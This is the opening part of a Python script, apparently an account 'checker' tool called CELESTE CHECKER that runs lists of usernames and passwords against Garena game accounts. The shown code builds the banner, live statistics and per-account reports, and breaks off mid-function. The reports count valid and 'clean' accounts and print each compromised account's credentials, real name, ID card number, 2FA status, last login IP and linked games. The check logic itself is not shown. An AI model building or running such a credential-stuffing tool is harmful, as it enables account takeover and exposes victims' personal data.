import hashlib
import json
import logging
import threading
import random
import os
import re
import sys
import time
import urllib.parse
import math
import uuid
import subprocess
import platform
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from pathlib import Path
from threading import Lock, Event, local
from collections import deque
import signal
import base64
import socket
import shutil

import colorama
import requests
from Crypto.Cipher import AES

import gzip
import hmac
import string
from io import BytesIO
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from cryptography import x509
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

colorama.init(autoreset=True)

RESET = '\033[0m'
BOLD = '\033[1m'
DIM = '\033[2m'
ITALIC = '\033[3m'

BEIGE = '\033[38;2;245;235;220m'
SOFT_WHITE = '\033[38;2;255;250;240m'
WARM_GRAY = '\033[38;2;200;185;170m'
TERRACOTTA = '\033[38;2;200;120;90m'
SAGE = '\033[38;2;160;190;150m'
OCHRE = '\033[38;2;210;170;100m'
TAUPE = '\033[38;2;180;160;140m'
DUSTY_ROSE = '\033[38;2;210;150;150m'
CLAY = '\033[38;2;190;140;110m'
IVORY = '\033[38;2;255;248;230m'
STONE = '\033[38;2;170;160;145m'
EARTH = '\033[38;2;140;110;80m'
MOSS = '\033[38;2;130;160;120m'
TERRA = '\033[38;2;190;130;100m'
SAND = '\033[38;2;220;205;180m'
PEBBLE = '\033[38;2;160;155;145m'
MIST = '\033[38;2;200;195;185m'

RED = TERRACOTTA
GREEN = SAGE
YELLOW = OCHRE
CYAN = DUSTY_ROSE
MAGENTA = CLAY
BLUE = TAUPE
ORANGE = OCHRE
GRAY = WARM_GRAY
BRIGHT_BLACK = STONE
WHITE = SOFT_WHITE

FILE_LOCK = Lock()
_SCRIPT_DIR_COOKIE = os.path.dirname(os.path.abspath(__file__))
_TG_HOOK = None
shutdown_event = Event()

def signal_handler(signum, frame):
    print(f"\n\n   {TERRACOTTA}[!] Session interrupted by user. Stopping threads cleanly...{RESET}\n")
    shutdown_event.set()
    os._exit(0)

signal.signal(signal.SIGINT, signal_handler)

CODM_REGIONS = {
    'TH': {'name': 'Thailand', 'code': '66', 'flag': '🇹🇭'},
    'VN': {'name': 'Vietnam', 'code': '84', 'flag': '🇻🇳'},
    'ID': {'name': 'Indonesia', 'code': '62', 'flag': '🇮🇩'},
    'TW': {'name': 'Taiwan', 'code': '886', 'flag': '🇹🇼'},
    'HK': {'name': 'Hong Kong', 'code': '852', 'flag': '🇭🇰'},
    'SG': {'name': 'Singapore', 'code': '65', 'flag': '🇸🇬'},
    'MY': {'name': 'Malaysia', 'code': '60', 'flag': '🇲🇾'},
    'PH': {'name': 'Philippines', 'code': '63', 'flag': '🇵🇭'},
    'IN': {'name': 'India', 'code': '91', 'flag': '🇮🇳'},
    'BD': {'name': 'Bangladesh', 'code': '880', 'flag': '🇧🇩'},
    'PK': {'name': 'Pakistan', 'code': '92', 'flag': '🇵🇰'},
    'EU': {'name': 'Europe', 'code': '0', 'flag': '🇪🇺'},
    'ME': {'name': 'Middle East', 'code': '0', 'flag': '🇸🇦'},
    'BR': {'name': 'Brazil', 'code': '55', 'flag': '🇧🇷'},
    'US': {'name': 'United States', 'code': '1', 'flag': '🇺🇸'},
    'NA': {'name': 'North America', 'code': '1', 'flag': '🇨🇦'},
    'SAC': {'name': 'South America', 'code': '0', 'flag': '🇦🇷'},
    'CIS': {'name': 'CIS Countries', 'code': '0', 'flag': '🇷🇺'},
    'KR': {'name': 'South Korea', 'code': '82', 'flag': '🇰🇷'},
    'JP': {'name': 'Japan', 'code': '81', 'flag': '🇯🇵'},
}

DEFAULT_THREADS = 5
CHECK_OTHER_GAMES = False
GAME_FILE_MAP = {
    'CODM': 'CODM.txt',
    'FREEFIRE': 'FreeFire.txt',
    'FREE FIRE': 'FreeFire.txt',
    'ROV': 'ROV.txt',
    'DELTA FORCE': 'DeltaForce.txt',
    'AOV': 'AOV.txt',
    'SPEED DRIFTERS': 'SpeedDrifters.txt',
    'BLACK CLOVER M': 'BlackCloverM.txt',
    'GARENA UNDAWN': 'Undawn.txt',
    'FC ONLINE': 'FCOnline.txt',
    'FC ONLINE M': 'FCOnlineM.txt',
    'MOONLIGHT BLADE': 'MoonlightBlade.txt',
    'FAST THRILL': 'FastThrill.txt',
    'THE WORLD OF WAR': 'WorldOfWar.txt'
}

GAME_DISPLAY_NAMES = [
    ('CODM', 'CODM'),
    ('FREEFIRE', 'Free Fire'),
    ('ROV', 'ROV'),
    ('DELTA FORCE', 'Delta Force'),
    ('AOV', 'AOV'),
    ('SPEED DRIFTERS', 'Speed Drifters'),
    ('BLACK CLOVER M', 'Black Clover M'),
    ('GARENA UNDAWN', 'Undawn'),
    ('FC ONLINE', 'FC Online'),
    ('FC ONLINE M', 'FC Online M'),
    ('MOONLIGHT BLADE', 'Moonlight Blade'),
    ('FAST THRILL', 'Fast Thrill'),
    ('THE WORLD OF WAR', 'World of War')
]

OAUTH_MAX_RETRIES = 3
OAUTH_RETRY_DELAY = 2

def get_display_width(text):
    plain_text = re.sub(r'\x1B\[[0-?]*[ -/]*[@-~]', '', text)
    return len(plain_text)

def format_size(size_bytes):
    if size_bytes == 0:
        return "0B"
    size_name = ("B", "KB", "MB", "GB", "TB")
    i = int(math.floor(math.log(size_bytes, 1024)))
    p = math.pow(1024, i)
    s = round(size_bytes / p, 2)
    return f"{s}{size_name[i]}"

def get_unique_progress_bar(count, total, length=30):
    if total == 0:
        progress = 0
    else:
        progress = count / total
    filled_length = int(length * progress)
    bar = '█' * filled_length + '░' * (length - filled_length)
    hue = (1 - progress) * 0.6
    r = int(220 + 30 * (1 - hue))
    g = int(180 + 50 * hue)
    b = int(140 + 40 * (1 - hue))
    col = f'\033[38;2;{r};{g};{b}m'
    return f"{col}{bar}{RESET}"

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def add_indent(text, spaces=8):
    prefix = " " * spaces
    return "\n".join(prefix + line for line in text.split("\n"))

def _w(n=72):
    try:
        cols = os.get_terminal_size((80, 24)).columns
        return min(cols - 4, n)
    except:
        return min(72, n)

def _strip_rich(text):
    return re.sub('\\[/?[^\\]]+\\]', '', str(text))

def _ts():
    return datetime.now().strftime('%H:%M:%S')

def _kv(key, val, kc=None, vc=None, kw=18):
    kc = kc or WARM_GRAY
    vc = vc or SOFT_WHITE
    clean_val = _strip_rich(str(val))
    print(f'  {kc}{key:<{kw}}{RESET}  {vc}{clean_val}{RESET}')

def _abox_open(title, bc=None, tc=None, w=None):
    bc = bc or DUSTY_ROSE
    tc = tc or SOFT_WHITE
    bw = w or _w(66)
    t = _strip_rich(title)
    tp = max(0, bw - len(t) - 1)
    print(f"  {bc}┏{'━' * (bw + 2)}┓{RESET}")
    print(f"  {bc}┃{RESET} {tc}{t}{RESET}{' ' * tp} {bc}┃{RESET}")
    print(f"  {bc}┣{'━' * (bw + 2)}┫{RESET}")

def _abox_row(key, val, vc=None, bc=None, kw=18, w=None):
    bc = bc or DUSTY_ROSE
    vc = vc or SOFT_WHITE
    bw = w or _w(66)
    k = f'{WARM_GRAY}{key:<{kw}}{RESET}'
    val_str = _strip_rich(str(val))
    v = f'{vc}{val_str}{RESET}'
    vis = kw + len(val_str)
    pad = max(0, bw - vis - 1)
    print(f"  {bc}┃{RESET} {k} {v}{' ' * pad} {bc}┃{RESET}")

def _abox_sep(bc=None, w=None):
    bc = bc or DUSTY_ROSE
    bw = w or _w(66)
    print(f"  {bc}┠{'─' * (bw + 2)}┨{RESET}")

def _abox_close(bc=None, w=None):
    bc = bc or DUSTY_ROSE
    bw = w or _w(66)
    print(f"  {bc}┗{'━' * (bw + 2)}┛{RESET}")

def _log(level: str, msg: str, indent: str = '  '):
    log_icons = {
        'INFO': (SOFT_WHITE, 'ℹ'),
        'SUCCESS': (SAGE, '✔'),
        'WARNING': (OCHRE, '⚠'),
        'ERROR': (TERRACOTTA, '✖'),
        'DEBUG': (WARM_GRAY, '·'),
        'REQUEST': (DUSTY_ROSE, '→'),
        'RESPONSE': (DUSTY_ROSE, '←'),
        'RETRY': (OCHRE, '↺'),
        'PROXY': (CLAY, '⬡'),
        'THREAD': (CLAY, '⧫'),
        'SAVE': (SAGE, '⬇')
    }
    col, icon = log_icons.get(level, (WARM_GRAY, '·'))
    ts = _ts()
    clean = _strip_rich(msg)
    print(f'{indent}{WARM_GRAY}[{ts}]{RESET}  {col}{icon}{RESET}  {clean}')

def get_my_ip_info():
    try:
        resp = requests.get('http://ip-api.com/json/', timeout=8)
        if resp.status_code == 200:
            data = resp.json()
            if data.get('status') == 'success':
                return {
                    'ip': data.get('query', 'Unknown'),
                    'country': data.get('country', 'Unknown'),
                    'region': data.get('regionName', 'Unknown'),
                    'city': data.get('city', 'Unknown'),
                    'isp': data.get('isp', 'Unknown'),
                    'asn': data.get('as', 'Unknown'),
                    'timezone': data.get('timezone', 'Unknown')
                }
    except:
        pass
    return None

def display_banner():
    clear_screen()

    def get_prop(prop):
        try:
            return subprocess.check_output(["getprop", prop], text=True, stderr=subprocess.DEVNULL).strip() or "Unknown"
        except:
            return "Unknown"

    try:
        brand = get_prop("ro.product.brand").upper()
        model = get_prop("ro.product.model")
        dev_name = get_prop("ro.product.marketname")
        if dev_name == "Unknown":
            dev_name = model
        chipset = get_prop("ro.board.platform")
        if chipset == "Unknown":
            chipset = get_prop("ro.hardware")
        android_ver = get_prop("ro.build.version.release")
        build = get_prop("ro.build.display.id")
    except:
        dev_name = platform.node() or "Unknown"
        brand = "Unknown"
        model = "Unknown"
        chipset = platform.machine() or "Unknown"
        android_ver = platform.release() or "Unknown"
        build = platform.version() or "Unknown"

    ip_info = get_my_ip_info()

    garen_logo = [
        r"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⡤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
        r"⠀⠀⠀⠀⠀⠀⢀⣤⡶⠁⣠⣴⣾⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
        r"⠀⠀⠀⠀⢀⣴⣿⣿⣴⣿⠿⠋⣁⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
        r"⠀⠀⠀⣰⣿⣿⣿⣿⣿⣷⣾⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣄⡀⠀⠀⠀⠀⠀⠀⠀",
        r"⠀⣠⣾⣿⡿⠟⠋⠉⠀⣀⣀⣀⣨⣭⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⣤⣤⣤⣴⠂",
        r"⠈⠉⠁⠀⠀⣀⣴⣾⣿⣿⡿⠟⠛⠉⠉⠉⠉⠉⠛⠻⠿⠿⠿⠿⠿⠿⠟⠋⠁⠀",
        r"⠀⠀⠀⢀⣴⣿⣿⣿⡿⠁⠀⢀⣀⣤⣤⣤⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
        r"⠀⠀⠀⣾⣿⣿⣿⡿⠁⢀⣴⣿⠋⠉⠉⠉⠉⠛⣿⣿⣶⣤⣤⣤⣤⣶⠖⠀⠀⠀",
        r"⠀⠀⢸⣿⣿⣿⣿⡇⢀⣿⣿⣇⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⡿⠃⠀⠀⠀⠀",
        r"⠀⠀⠸⣿⣿⣿⣿⡇⠈⢿⣿⣿⠇⠀⠀⠀⠀⠀⢠⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀",
        r"⠀⠀⠀⢿⣿⣿⣿⣷⡀⠀⠉⠉⠀⠀⠀⠀⠀⢀⣾⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀",
        r"⠀⠀⠀⠀⠙⢿⣿⣿⣷⣄⡀⠀⠀⠀⠀⣀⣴⣿⣿⣿⣋⣠⡤⠄⠀⠀⠀⠀⠀⠀",
        r"⠀⠀⠀⠀⠀⠀⠈⠙⠛⠛⠿⠿⠿⠿⠿⠿⠟⠛⠛⠛⠉⠁⠀⠀"
    ]

    def strip_ansi(txt):
        return re.sub(r'\x1B\[[0-?]*[ -/]*[@-~]', '', txt)

    logo_width = max(len(strip_ansi(line)) for line in garen_logo)
    logo_padded = [line.ljust(logo_width + 2) for line in garen_logo]

    box_w = 48
    title1 = "CELESTE CHECKER"
    title2 = "Established by @lleessiee"

    info_lines = []
    info_lines.append(f"{WARM_GRAY}╔{'═' * (box_w)}╗{RESET}")
    info_lines.append(f"{WARM_GRAY}║{DUSTY_ROSE} {title1.center(box_w - 2)} {RESET}{WARM_GRAY}║{RESET}")
    info_lines.append(f"{WARM_GRAY}║{OCHRE} {title2.center(box_w - 2)} {RESET}{WARM_GRAY}║{RESET}")
    info_lines.append(f"{WARM_GRAY}╠{'═' * (box_w)}╣{RESET}")

    dev_rows = [
        ("DEVICE", dev_name),
        ("BRAND", brand),
        ("MODEL", model),
        ("CHIPSET", chipset),
        ("ANDROID", android_ver),
        ("BUILD", build)
    ]

    for lbl, val in dev_rows:
        clean_val = re.sub(r'[^\x20-\x7E]', '', str(val)).strip()
        max_v_len = box_w - 3 - len(lbl)
        val_str = clean_val[:max_v_len] if len(clean_val) > max_v_len else clean_val
        combined_len = len(lbl) + 1 + len(val_str)
        pad = max(0, box_w - 2 - combined_len)
        info_lines.append(f"{WARM_GRAY}║{RESET} {CLAY}{lbl}{RESET} {SAGE}{val_str}{RESET}{' ' * pad} {WARM_GRAY}║{RESET}")

    if ip_info:
        info_lines.append(f"{WARM_GRAY}╠{'═' * (box_w)}╣{RESET}")
        ip_rows = [
            ("IP", ip_info['ip']),
            ("LOCATION", f"{ip_info['city']}, {ip_info['region']}, {ip_info['country']}"),
            ("ISP", ip_info['isp']),
            ("ASN", ip_info['asn']),
            ("TZ", ip_info['timezone'])
        ]
        for lbl, val in ip_rows:
            clean_val = re.sub(r'[^\x20-\x7E]', '', str(val)).strip()
            max_v_len = box_w - 3 - len(lbl)
            val_str = clean_val[:max_v_len] if len(clean_val) > max_v_len else clean_val
            combined_len = len(lbl) + 1 + len(val_str)
            pad = max(0, box_w - 2 - combined_len)
            info_lines.append(f"{WARM_GRAY}║{RESET} {DUSTY_ROSE}{lbl}{RESET} {OCHRE}{val_str}{RESET}{' ' * pad} {WARM_GRAY}║{RESET}")

    info_lines.append(f"{WARM_GRAY}╚{'═' * (box_w)}╯{RESET}")

    info_padded = [line.ljust(box_w + 2) for line in info_lines]

    earth_colors = [CLAY, OCHRE, SAGE, TAUPE, DUSTY_ROSE, BEIGE]
    print("")
    max_rows = max(len(logo_padded), len(info_padded))
    for i in range(max_rows):
        logo_part = logo_padded[i] if i < len(logo_padded) else " " * (logo_width + 2)
        col = earth_colors[i % len(earth_colors)]
        info_part = info_padded[i] if i < len(info_padded) else ""
        if info_part:
            print(f"  {col}{logo_part}{RESET} {info_part}")
        else:
            print(f"  {col}{logo_part}{RESET}")
    print("\n")

GARENA_UI_HEIGHT = 11
_ui_refresh_interval = 0.5
_ui_refresh_event = threading.Event()
_ui_dirty = True
_ui_lock = threading.Lock()
_ui_stats = {}


def build_live_stats_ui(stats, width=75):
    spinner_colors = [CLAY, OCHRE, SAGE, TAUPE, DUSTY_ROSE]
    sc = spinner_colors[int(time.time() * 10) % len(spinner_colors)]
    anim_char = f"{sc}◉{RESET}"

    def strip_ansi(text):
        return re.sub(r'\x1B\[[0-?]*[ -/]*[@-~]', '', str(text))

    def visible_len(text):
        return len(strip_ansi(text))

    def pad_cell(text, size):
        clean = strip_ansi(text)

        if len(clean) >= size:
            return clean[:size]

        return text + (" " * (size - len(clean)))

    inner_width = width - 2

    total_inner = inner_width - 2
    base_width = total_inner // 3
    remainder = total_inner % 3

    col1_width = base_width + (1 if remainder > 0 else 0)
    col2_width = base_width + (1 if remainder > 1 else 0)
    col3_width = base_width

    checked_amt = stats.get("checked", 0)
    total_amt = stats.get("total", 0)
    elapsed = stats.get("elapsed", 0)

    valid = stats.get("valid", 0)
    invalid = stats.get("invalid", 0)
    clean = stats.get("clean", 0)
    not_clean = stats.get("not_clean", 0)

    has_codm = stats.get("has_codm", 0)
    no_codm = stats.get("no_codm", 0)
    high_lvl = stats.get("high_lvl", 0)
    high_shell = stats.get("high_shell", 0)
    high_clean = stats.get("high_clean", 0)

    progress = max(
        0,
        min(100, stats.get("progress", 0))
    )

    bar_len = max(10, inner_width - 27)
    filled = int(bar_len * (progress / 100))

    if progress >= 100:
        progress_bar = (
            f"{SAGE}"
            f"{'█' * bar_len}"
            f"{RESET}"
        )
    else:
        progress_bar = (
            f"{DUSTY_ROSE}"
            f"{'█' * filled}"
            f"{RESET}"
            f"{STONE}"
            f"{'░' * (bar_len - filled)}"
            f"{RESET}"
        )

    progress_content = (
        f" {SOFT_WHITE}PROGRESS{STONE}:{RESET} "
        f"{progress_bar} "
        f"{SOFT_WHITE}{progress:5.1f}%{RESET}"
    )

    progress_plain = strip_ansi(progress_content)
    progress_padding = max(
        0,
        inner_width - len(progress_plain)
    )

    top = (
        f"{WARM_GRAY}╔"
        f"{'═' * inner_width}"
        f"╗{RESET}"
    )

    title = (
        f"{anim_char} "
        f"{SOFT_WHITE}LIVE STATISTICS{RESET}"
    )

    title_padding = max(
        0,
        inner_width - visible_len(title)
    )

    title_row = (
        f"{WARM_GRAY}║"
        f"{title}"
        f"{' ' * title_padding}"
        f"{WARM_GRAY}║{RESET}"
    )

    separator = (
        f"{WARM_GRAY}╠"
        f"{'═' * inner_width}"
        f"╣{RESET}"
    )

    progress_row = (
        f"{WARM_GRAY}║"
        f"{progress_content}"
        f"{' ' * progress_padding}"
        f"{WARM_GRAY}║{RESET}"
    )

    column_separator = (
        f"{WARM_GRAY}╠"
        f"{'─' * col1_width}"
        f"┼"
        f"{'─' * col2_width}"
        f"┼"
        f"{'─' * col3_width}"
        f"╣{RESET}"
    )

    def make_row(left, middle, right):
        left = pad_cell(left, col1_width)
        middle = pad_cell(middle, col2_width)
        right = pad_cell(right, col3_width)

        return (
            f"{WARM_GRAY}║{RESET}"
            f"{left}"
            f"{WARM_GRAY}│{RESET}"
            f"{middle}"
            f"{WARM_GRAY}│{RESET}"
            f"{right}"
            f"{WARM_GRAY}║{RESET}"
        )

    rows = [
        make_row(
            f"{DUSTY_ROSE}TOTAL{STONE}: {SOFT_WHITE}{checked_amt}/{total_amt}{RESET}",
            f"{SAGE}VALID{STONE}: {SAGE}{valid}{RESET}",
            f"{DUSTY_ROSE}HAS CODM{STONE}: {DUSTY_ROSE}{has_codm}{RESET}"
        ),

        make_row(
            f"{SOFT_WHITE}TIME{STONE}: {SOFT_WHITE}{elapsed:.1f}s{RESET}",
            f"{TERRACOTTA}INVALID{STONE}: {TERRACOTTA}{invalid}{RESET}",
            f"{OCHRE}NO CODM{STONE}: {OCHRE}{no_codm}{RESET}"
        ),

        make_row(
            "",
            f"{SAGE}CLEAN{STONE}: {SAGE}{clean}{RESET}",
            f"{CLAY}H. LEVEL{STONE}: {CLAY}{high_lvl}{RESET}"
        ),

        make_row(
            "",
            f"{TERRACOTTA}NOT CLEAN{STONE}: {TERRACOTTA}{not_clean}{RESET}",
            f"{OCHRE}H. SHELLS{STONE}: {OCHRE}{high_shell}{RESET}"
        ),

        make_row(
            "",
            "",
            f"{SAGE}H. CLEAN{STONE}: {SAGE}{high_clean}{RESET}"
        )
    ]

    bottom = (
        f"{WARM_GRAY}╚"
        f"{'═' * inner_width}"
        f"╝{RESET}"
    )

    return "\n".join(
        [
            top,
            title_row,
            separator,
            progress_row,
            column_separator,
            rows[0],
            rows[1],
            rows[2],
            rows[3],
            rows[4],
            bottom
        ]
    )

def display_summary(
    total_checked,
    failed,
    valid,
    categorized_levels,
    countries,
    original_total,
    highest_clean=0,
    highest_not_clean=0,
    highest_shells=0
):
    w = _w(72)
    left = "  "

    def strip_ansi(t):
        return re.sub(r'\x1B\[[0-?]*[ -/]*[@-~]', '', str(t))

    def visible_len(t):
        return len(strip_ansi(t))

    def fit_line(content):
        available = w - 4
        clean = strip_ansi(content)

        if len(clean) > available:
            content = clean[:available]

        padding = max(0, available - visible_len(content))

        return (
            f"{left}{WARM_GRAY}│{RESET}"
            f" {content}"
            f"{' ' * padding} "
            f"{WARM_GRAY}│{RESET}"
        )

    def separator(char="─"):
        print(
            f"{left}{WARM_GRAY}"
            f"{char * (w - 4)}"
            f"{RESET}"
        )

    def section(title, symbol, color):
        content = (
            f"{color}{symbol}{RESET} "
            f"{SOFT_WHITE}{title}{RESET}"
        )
        print(fit_line(content))

    def stat(label, value, color=SOFT_WHITE, symbol="›"):
        content = (
            f"{WARM_GRAY}{symbol}{RESET} "
            f"{SOFT_WHITE}{label:<19}{RESET}"
            f"{WARM_GRAY}│{RESET} "
            f"{color}{value}{RESET}"
        )
        print(fit_line(content))

    print()

    print(
        f"{left}{DUSTY_ROSE}"
        f"╭{'─' * (w - 4)}╮"
        f"{RESET}"
    )

    title = (
        f"{DUSTY_ROSE}✦{RESET} "
        f"{SOFT_WHITE}SESSION COMPLETE{RESET}"
        f"  {WARM_GRAY}⌁{RESET}  "
        f"{OCHRE}FINAL REPORT{RESET}"
    )

    title_padding = max(
        0,
        (w - 4) - visible_len(title)
    )

    print(
        f"{left}{WARM_GRAY}│{RESET} "
        f"{title}"
        f"{' ' * title_padding} "
        f"{WARM_GRAY}│{RESET}"
    )

    print(
        f"{left}{WARM_GRAY}"
        f"├{'─' * (w - 4)}┤"
        f"{RESET}"
    )

    section("SESSION OVERVIEW", "◈", DUSTY_ROSE)

    stat(
        "Credentials Processed",
        f"{total_checked}/{original_total}",
        SOFT_WHITE,
        "✦"
    )

    stat(
        "Valid Credentials",
        valid,
        SAGE,
        "✓"
    )

    stat(
        "Failed / Invalid",
        failed,
        TERRACOTTA,
        "×"
    )

    print(
        f"{left}{WARM_GRAY}"
        f"├{'─' * (w - 4)}┤"
        f"{RESET}"
    )

    section("LEVEL DISTRIBUTION", "◆", CLAY)

    level_ranges = {
        "1–49": categorized_levels.get("1-49", 0),
        "50–99": categorized_levels.get("50-99", 0),
        "100–199": categorized_levels.get("100-199", 0),
        "200–299": categorized_levels.get("200-299", 0),
        "300–400": categorized_levels.get("300-400", 0)
    }

    level_items = [
        (level, count)
        for level, count in level_ranges.items()
        if count > 0
    ]

    if level_items:
        for level, count in level_items:
            stat(
                f"Level {level}",
                count,
                DUSTY_ROSE,
                "⌁"
            )
    else:
        stat(
            "Distribution",
            "No data",
            WARM_GRAY,
            "·"
        )

    if countries:
        print(
            f"{left}{WARM_GRAY}"
            f"├{'─' * (w - 4)}┤"
            f"{RESET}"
        )

        section("REGIONAL DISTRIBUTION", "◇", OCHRE)

        country_counts = {}

        for country in countries:
            country_name = re.sub(
                r'\s*\([^)]*\)',
                '',
                str(country)
            ).strip()

            country_counts[country_name] = (
                country_counts.get(country_name, 0) + 1
            )

        top_countries = sorted(
            country_counts.items(),
            key=lambda item: item[1],
            reverse=True
        )[:5]

        for country, count in top_countries:
            stat(
                country,
                count,
                CLAY,
                "⌁"
            )

    print(
        f"{left}{WARM_GRAY}"
        f"├{'─' * (w - 4)}┤"
        f"{RESET}"
    )

    section("HIGHEST RECORDED", "✧", SAGE)

    stat(
        "Highest Clean",
        f"Level {highest_clean}",
        SAGE,
        "↑"
    )

    stat(
        "Highest Bound",
        f"Level {highest_not_clean}",
        OCHRE,
        "↑"
    )

    stat(
        "Highest Shells",
        highest_shells,
        CLAY,
        "◇"
    )

    print(
        f"{left}{WARM_GRAY}"
        f"├{'─' * (w - 4)}┤"
        f"{RESET}"
    )

    footer = (
        f"{DUSTY_ROSE}✦{RESET} "
        f"{SOFT_WHITE}REPORT GENERATED{RESET}"
        f"  {WARM_GRAY}·{RESET}  "
        f"{WARM_GRAY}session data finalized{RESET}"
    )

    footer_padding = max(
        0,
        (w - 4) - visible_len(footer)
    )

    print(
        f"{left}{WARM_GRAY}│{RESET} "
        f"{footer}"
        f"{' ' * footer_padding} "
        f"{WARM_GRAY}│{RESET}"
    )

    print(
        f"{left}{DUSTY_ROSE}"
        f"╰{'─' * (w - 4)}╯"
        f"{RESET}\n"
    )

def get_flag(code):
    try:
        return "".join(chr(ord(c) + 127397) for c in str(code).upper())
    except:
        return ""

def format_hit(username, password, shell, level, region, nickname, uid, mobile, email, email_ver, two_step, auth_app, country, last_login, is_clean, fb_link="N/A", fb_info="NOT CONNECTED", last_login_ip="Unknown", has_codm=True, connected_games=None, colorized=False, last_login_from="UNKNOWN", avatar="N/A", suspicious="FALSE", real_name="N/A", id_card="N/A", signature="N/A", password_strength="N/A", email_verified_time="N/A", id_card_length="N/A", whitelistable="N/A", realinfo_updatable="N/A", account_created="N/A"):
    if connected_games is None:
        connected_games = []
    c_flag = get_flag(country) if country and country != 'N/A' else ''
    r_flag = get_flag(region) if region and region != 'N/A' else ''

    def sep_line(col, width=58):
        return f"{col}{'─' * width}{RESET}"

    def header_footer_line(col, text, width=58):
        dashes = (width - len(text) - 4) // 2
        if dashes < 0:
            dashes = 0
        return f"{col}◆{'─' * dashes} {text} {'─' * dashes}◆{RESET}"

    def kv_line(key, value, kc, vc):
        if value is None or value == '':
            value = 'N/A'
        return f"{kc}{key}{RESET}: {vc}{value}{RESET}"

    width = 58
    avatar_display = avatar
    if avatar and avatar != 'N/A' and len(avatar) > (width - 14):
        avatar_display = avatar[:width - 17] + '...'

    if colorized:
        lines = []
        label_col = WARM_GRAY
        value_col = SOFT_WHITE
        sep_col = DUSTY_ROSE
        title_col = DUSTY_ROSE

        lines.append(header_footer_line(sep_col, f'ACCOUNT #{username}', width))
        lines.append(kv_line("Credentials", f"{username}:{password}", label_col, value_col))
        lines.append(kv_line("Shells", shell, label_col, value_col))
        lines.append(sep_line(sep_col, width))
        lines.append(f"  {title_col}◈  PROFILE DETAILS{RESET}")
        lines.append(kv_line("Real Name", real_name, label_col, value_col))
        lines.append(kv_line("ID Card", id_card, label_col, value_col))
        lines.append(kv_line("ID Card Len", id_card_length, label_col, value_col))
        lines.append(kv_line("Signature", signature, label_col, value_col))
        lines.append(kv_line("Avatar", avatar_display, label_col, value_col))
        lines.append(kv_line("Password Str", password_strength, label_col, value_col))
        lines.append(kv_line("Account Cre", account_created, label_col, value_col))
        lines.append(kv_line("Suspicious", suspicious, label_col, value_col))

        if has_codm and level and level != 'N/A':
            lines.append(sep_line(SAGE, width))
            lines.append(f"  {SAGE}◈  CALL OF DUTY: MOBILE{RESET}")
            lines.append(kv_line("Nickname", nickname, label_col, value_col))
            lines.append(kv_line("UID", uid, label_col, value_col))
            lines.append(kv_line("Level", level, label_col, value_col))
            lines.append(kv_line("Server", f"{region} {r_flag}", label_col, value_col))

        lines.append(sep_line(TAUPE, width))
        lines.append(f"  {TAUPE}◈  ACCOUNT SECURITY{RESET}")
        lines.append(kv_line("FB Connected", fb_info, label_col, value_col))
        lines.append(kv_line("Mobile", mobile, label_col, value_col))
        lines.append(kv_line("2FA", two_step, label_col, value_col))
        lines.append(kv_line("Auth App", auth_app, label_col, value_col))
        lines.append(kv_line("Whitelistable", whitelistable, label_col, value_col))
        lines.append(kv_line("RealInfo Upd", realinfo_updatable, label_col, value_col))
        lines.append(kv_line("Email Ver", email_verified_time, label_col, value_col))

        lines.append(sep_line(CLAY, width))
        lines.append(f"  {CLAY}◈  RECENT LOGIN{RESET}")
        lines.append(kv_line("Last Login", last_login, label_col, value_col))
        lines.append(kv_line("IP", last_login_ip, label_col, value_col))
        lines.append(kv_line("From", last_login_from, label_col, value_col))

        if connected_games:
            lines.append(sep_line(MAGENTA, width))
            lines.append(f"  {MAGENTA}◈  CONNECTED GAMES{RESET}")
            for g in connected_games:
                lines.append(f"  {label_col}• {RESET}{value_col}{g}{RESET}")
        else:
            lines.append(sep_line(MAGENTA, width))
            lines.append(f"  {MAGENTA}◈  CONNECTED GAMES{RESET}")
            lines.append(f"  {label_col}None{RESET}")

        lines.append(header_footer_line(sep_col, ' @lleessiee ', width))
        return "\n".join(lines)

    else:
        lines = []
        width = 58
        dashes = (width - 4 - len('ACCOUNT')) // 2
        lines.append("◆" + "─" * dashes + " ACCOUNT " + "─" * (width - 2 - dashes - len('ACCOUNT')) + "◆")
        lines.append(f"Credentials: {username}:{password}")
        lines.append(f"Shells: {shell}")
        lines.append("─" * width)
        lines.append("◈  PROFILE DETAILS")
        lines.append(f"Real Name: {real_name}")
        lines.append(f"ID Card: {id_card}")
        lines.append(f"ID Card Len: {id_card_length}")
        lines.append(f"Signature: {signature}")
        lines.append(f"Avatar: {avatar_display}")
        lines.append(f"Password Str: {password_strength}")
        lines.append(f"Account Cre: {account_created}")
        lines.append(f"Suspicious: {suspicious}")
        if has_codm and level and level != 'N/A':
            lines.append("─" * width)
            lines.append("◈  CALL OF DUTY: MOBILE")
            lines.append(f"Nickname: {nickname}")
            lines.append(f"UID: {uid}")
            lines.append(f"Level: {level}")
            lines.append(f"Server: {region} {r_flag}")
        lines.append("─" * width)
        lines.append("◈  ACCOUNT SECURITY")
        lines.append(f"FB Connected: {fb_info}")
        lines.append(f"Mobile: {mobile}")
        lines.append(f"2FA: {two_step}")
        lines.append(f"Auth App: {auth_app}")
        lines.append(f"Whitelistable: {whitelistable}")
        lines.append(f"RealInfo Upd: {realinfo_updatable}")
        lines.append(f"Email Ver: {email_verified_time}")
        lines.append("─" * width)
        lines.append("◈  RECENT LOGIN")
        lines.append(f"Last Login: {last_login}")
        lines.append(f"IP: {last_login_ip}")
        lines.append(f"From: {last_login_from}")
        if connected_games:
            lines.append("─" * width)
            lines.append("◈  CONNECTED GAMES")
            for g in connected_games:
                lines.append(f"• {g}")
        else:
